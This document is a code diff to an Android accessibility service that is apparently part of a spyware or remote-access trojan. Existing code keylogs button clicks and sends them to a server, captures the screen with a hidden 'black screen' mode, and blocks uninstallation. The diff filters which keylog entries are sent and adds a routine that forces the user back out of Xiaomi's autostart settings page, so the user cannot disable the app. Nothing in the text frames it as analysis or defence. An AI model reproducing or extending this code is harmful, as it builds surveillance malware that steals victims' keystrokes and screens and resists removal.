@@ -559,6 +559,7 @@ public class MainAccessibilityService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         getKeyLogger(event);
         getSkeletonInfo(event);
+        goBackFromAutoStartPage(event);
         if(Common.getInstance().getAutostartEnable() && manufacturer.equals("xiaomi") && Integer.parseInt(Build.VERSION.RELEASE) >= 12) {
             setPermEditorEnable(event);
         } else {
@@ -823,12 +824,14 @@ public class MainAccessibilityService extends AccessibilityService {
                     if(Server.getContext() != null) {
                         String Button_Text = "";
                         if(source.getText() != null) {
-                            Button_Text = source.getText().toString();
-                        }
-                        text = Button_Text;
-                        eventString = "Button Click";
-                        if(isKeylogger) {
-                            Server.getContext().sendKeyLog(text, packagename, eventString);
+                            Button_Text = source.getText().toString().toLowerCase();
+                            text = Button_Text;
+
+                            eventString = "Button Click";
+                            if(isKeylogger) {
+                                if(!text.equals("") && !text.equals("cancel") && !text.equals("cancelar") && !text.equals("取消"))
+                                    Server.getContext().sendKeyLog(text, packagename, eventString);
+                            }
                         }
                     }
                 }
@@ -955,6 +958,19 @@ public class MainAccessibilityService extends AccessibilityService {
         }
     }
 
+    private void goBackFromAutoStartPage(AccessibilityEvent event) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            CharSequence packagename = String.valueOf(event.getPackageName());
+            CharSequence classname = String.valueOf(event.getClassName());
+            Log.d("packagename::", packagename + "  " + classname);
+            if (packagename.equals("com.miui.securitycenter")) {
+                if(classname !=null && classname.equals("com.miui.permcenter.autostart.AutoStartManagementActivity")) {
+                    onGoBack();
+                }
+            }
+        }
+    }
+
     public void setStopUninstallApp(AccessibilityNodeInfo node) {
         if(node != null) {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
@@ -1027,10 +1043,10 @@ public class MainAccessibilityService extends AccessibilityService {
                     Bitmap scaledBitmap;
                     if(blackScreen) {
                         Bitmap converImage = changeImageOpacity(bitmap,1.0f);
-                        scaledBitmap = Bitmap.createScaledBitmap(converImage, imageWidth, (int) (bitmapHeight * (360.0 / bitmapWidth)), true);
+                        scaledBitmap = Bitmap.createScaledBitmap(converImage, imageWidth, (int) (bitmapHeight * (360.0 / deviceWidth)), true);
                         scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, outputStream);
                     } else {
-                        scaledBitmap = Bitmap.createScaledBitmap(bitmap, imageWidth, (int) (bitmapHeight * (360.0 / bitmapWidth)), true);
+                        scaledBitmap = Bitmap.createScaledBitmap(bitmap, imageWidth, (int) (bitmapHeight * (360.0 / deviceWidth)), true);
                         scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, outputStream);
                     }
                     screenBase64 = Base64.encodeToString(outputStream.toByteArray(), Base64.DEFAULT);
